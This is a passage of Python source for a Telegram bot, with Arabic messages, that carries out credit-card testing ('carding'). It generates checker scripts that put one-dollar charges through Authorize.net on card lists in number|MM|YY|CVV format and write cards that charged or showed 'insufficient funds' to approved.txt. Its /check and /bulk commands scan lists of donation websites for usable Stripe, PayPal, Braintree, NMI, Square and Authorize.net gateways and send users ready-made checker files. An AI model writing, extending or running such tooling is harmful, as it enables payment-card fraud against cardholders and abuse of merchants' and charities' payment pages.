            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'CHARGED' in result or 'INSUFFICIENT' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

def generate_authorize_code(url, login_id, transaction_key):
    return f'''# Authorize.net Checker
# Site: {url}
import requests, json, time

class AuthorizeChecker:
    def __init__(self):
        self.login_id = "{login_id}"
        self.transaction_key = "{transaction_key}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        
        payload = {{
            'createTransactionRequest': {{
                'merchantAuthentication': {{'name': self.login_id, 'transactionKey': self.transaction_key}},
                'transactionRequest': {{
                    'transactionType': 'authCaptureTransaction',
                    'amount': '1.00',
                    'payment': {{'creditCard': {{'cardNumber': n, 'expirationDate': f'{{yy}}-{{mm}}', 'cardCode': cvc}}}}
                }}
            }}
        }}
        
        r = requests.post('https://apitest.authorize.net/xml/v1/request.api', json=payload, timeout=20)
        result = r.json()
        
        if result.get('messages', {{}}).get('resultCode') == 'Ok':
            return '✅ CHARGED 1$'
        else:
            msgs = result.get('messages', {{}}).get('message', [])
            msg = msgs[0].get('text', 'DECLINED') if msgs else 'DECLINED'
            if 'insufficient' in msg.lower(): return '💰 INSUFFICIENT FUNDS'
            elif 'declined' in msg.lower(): return '❌ CARD DECLINED'
            else: return f'❌ {{msg[:60]}}'

if __name__ == '__main__':
    checker = AuthorizeChecker()
    print('Authorize.net Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'CHARGED' in result or 'INSUFFICIENT' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

# ==================== أمر /check ====================
@bot.message_handler(commands=['check'])
def check_gateway_command(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return
    
    lines = message.text.split('\n')
    if len(lines) < 2:
        bot.reply_to(message, """❌ <b>الصيغة:</b>

<code>/check https://example.com/donate
4206120859214256|11|2027|982</code>""", parse_mode="HTML")
        return
    
    url = lines[0].replace('/check', '').strip()
    card_data = lines[1].strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    if len(card_data.split('|')) != 4:
        bot.reply_to(message, "❌ صيغة الكارت: <code>number|MM|YYYY|CVV</code>", parse_mode="HTML")
        return
    
    status_msg = bot.reply_to(message, f"🔍 <b>جاري الفحص الشامل...</b>\n\n<code>{url}</code>", parse_mode="HTML")
    
    # فحص كل البوابات بالترتيب
    result = None
    
    # 1. PayPal Give WP
    result = check_paypal_give(url, card_data)
    if not result or result.get('status') != 'LIVE':
        # 2. Stripe
        result = check_stripe(url, card_data)
    if not result or result.get('status') != 'LIVE':
        # 3. Braintree
        result = check_braintree(url, card_data)
    if not result or result.get('status') != 'LIVE':
        # 4. NMI
        result = check_nmi(url, card_data)
    if not result or result.get('status') != 'LIVE':
        # 5. Square
        result = check_square(url, card_data)
    if not result or result.get('status') != 'LIVE':
        # 6. Authorize.net
        result = check_authorize(url, card_data)
    
    if result and result.get('status') == 'LIVE':
        # حفظ في الملف
        with open('live_gateways.txt', 'a') as f:
            f.write(f"{result['gateway']}|{url}|{result['message']}|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        response_text = f"""🔥 <b>بوابة حية!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>الموقع:</b> <code>{url}</code>
💳 <b>البوابة:</b> {result['gateway']}
📊 <b>النتيجة:</b> {result['message']}
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
        
        # إرسال الكود
        code = result.get('code', '')
        if code:
            file_name = f'checker_{message.from_user.id}_{int(time.time())}.py'
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(code)
            with open(file_name, 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=response_text,
                    parse_mode="HTML"
                )
            os.remove(file_name)
        else:
            bot.edit_message_text(response_text, message.chat.id, status_msg.message_id, parse_mode="HTML")
    else:
        bot.edit_message_text("❌ <b>لا توجد بوابات حية</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")

# ==================== أمر /bulk ====================
@bot.message_handler(commands=['bulk'])
def bulk_check_command(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return
    
    lines = message.text.split('\n')
    if len(lines) < 1:
        bot.reply_to(message, "❌ أرسل الكارت:\n<code>/bulk 4206120859214256|11|2027|982</code>", parse_mode="HTML")
        return
    
    card_data = lines[0].replace('/bulk', '').strip()
    
    if len(card_data.split('|')) != 4:
        bot.reply_to(message, "❌ صيغة الكارت: <code>number|MM|YYYY|CVV</code>", parse_mode="HTML")
        return
    
    user_sessions[message.from_user.id] = {
        'card_data': card_data,
        'waiting_file': True
    }
    
    bot.reply_to(message, "📤 أرسل ملف .txt فيه المواقع (كل موقع في سطر)")

@bot.message_handler(content_types=['document'])
def handle_bulk_file(message):
    user_id = message.from_user.id
    
    if user_id not in user_sessions:
        bot.reply_to(message, "❌ أرسل /bulk مع الكارت أولاً")
        return
    
    if not user_sessions[user_id].get('waiting_file'):
        bot.reply_to(message, "❌ استخدم /bulk أولاً")
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    
    try:
        sites = [s.strip() for s in downloaded.decode('utf-8').splitlines() if s.strip()]
    except:
        sites = [s.strip() for s in downloaded.decode('latin-1').splitlines() if s.strip()]
    
    if not sites:
        bot.reply_to(message, "❌ ملف فارغ")
        return
    
    card_data = user_sessions[user_id]['card_data']
    
    status_msg = bot.reply_to(message, f"🔍 <b>جاري فحص {len(sites)} موقع...</b>\n\n💳: <code>{card_data[:6]}...{card_data[-4:]}</code>", parse_mode="HTML")
    
    task_id = f"{user_id}_{int(time.time())}"
    processing_status[task_id] = {'stop': False, 'found': 0}
    
    threading.Thread(target=process_bulk_sites, args=(task_id, sites, card_data, message.chat.id, status_msg.message_id)).start()

def process_bulk_sites(task_id, sites, card_data, chat_id, status_msg_id):
    found_live = 0
    
    for i, site in enumerate(sites, 1):
        if processing_status[task_id]['stop']:
            break
        
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
        
        # فحص كل البوابات
        result = None
        
        result = check_paypal_give(site, card_data)
        if not result or result.get('status') != 'LIVE':
            result = check_stripe(site, card_data)
        if not result or result.get('status') != 'LIVE':
            result = check_braintree(site, card_data)
        if not result or result.get('status') != 'LIVE':
            result = check_nmi(site, card_data)
        if not result or result.get('status') != 'LIVE':
            result = check_square(site, card_data)
        if not result or result.get('status') != 'LIVE':
            result = check_authorize(site, card_data)
        
        if result and result.get('status') == 'LIVE':
            found_live += 1
            processing_status[task_id]['found'] = found_live
            
            # حفظ
            with open('live_gateways.txt', 'a') as f:
                f.write(f"{result['gateway']}|{site}|{result['message']}|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            response_text = f"""🔥 <b>بوابة حية!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>الموقع:</b> <code>{site}</code>
💳 <b>البوابة:</b> {result['gateway']}
📊 <b>النتيجة:</b> {result['message']}
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
            
            code = result.get('code', '')
            if code:
                file_name = f'checker_{found_live}_{int(time.time())}.py'
                with open(file_name, 'w', encoding='utf-8') as f:
                    f.write(code)
                with open(file_name, 'rb') as f:
                    bot.send_document(
                        chat_id,
                        f,
                        caption=response_text,
                        parse_mode="HTML"
                    )
                os.remove(file_name)
            else:
                bot.send_message(chat_id, response_text, parse_mode="HTML")
        
        if i % 3 == 0 or i == len(sites):
            try:
                bot.edit_message_text(
                    f"""🔍 <b>التقدم:</b> {i}/{len(sites)}
━━━━━━━━━━━━━━━━━━━━
🔥 <b>بوابات حية:</b> {found_live}
━━━━━━━━━━━━━━━━━━━━
⏹️ /stop للإيقاف""",
                    chat_id,
                    status_msg_id,
                    parse_mode="HTML"
                )
            except:
                pass
        
        time.sleep(0.5)
    
    final_text = f"""✅ <b>اكتمل الفحص!</b>
━━━━━━━━━━━━━━━━━━━━
📦 <b>المواقع:</b> {len(sites)}
🔥 <b>بوابات حية:</b> {found_live}
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
    
    try:
        bot.edit_message_text(final_text, chat_id, status_msg_id, parse_mode="HTML")
    except:
        pass
    
    processing_status.pop(task_id, None)
    gc.collect()

@bot.message_handler(commands=['stop'])
def stop_bulk(message):
    user_id = message.from_user.id
    
    for task_id in list(processing_status.keys()):
        if task_id.startswith(str(user_id)):
            processing_status[task_id]['stop'] = True
    
    bot.reply_to(message, "⏹️ تم الإيقاف")

# === تشغيل البوت ===
print('✅ Bot is running...')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(5)
